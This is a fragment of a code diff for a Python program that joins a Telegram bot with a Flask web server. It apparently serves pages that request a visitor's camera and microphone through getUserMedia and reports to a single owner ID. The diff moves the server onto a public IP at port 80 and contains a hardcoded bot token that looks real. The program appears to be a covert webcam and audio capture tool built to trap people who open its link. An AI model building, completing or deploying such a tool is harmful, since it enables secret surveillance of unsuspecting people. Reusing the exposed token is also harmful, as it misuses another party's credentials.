@@ -4,7 +4,7 @@ import os, uuid
 
 BOT_TOKEN = "5383004720:AAHxtz1UJvcpOmdHCOwWCijb9ySnIXBZRYU"
 OWNER_ID = 5376094649
-DOMAIN = "http://38.180.115.186"
+DOMAIN = "http://38.180.115.186/80"
 
 bot = TeleBot(BOT_TOKEN)
 app = Flask(__name__)
@@ -125,5 +125,5 @@ navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream =>
 if __name__ == "__main__":
     os.makedirs("temp", exist_ok=True)
     from threading import Thread
-    Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000}).start()
+    Thread(target=app.run, kwargs={"host": "38.180.115.186", "port": 80}).start()
     bot.polling(none_stop=True)
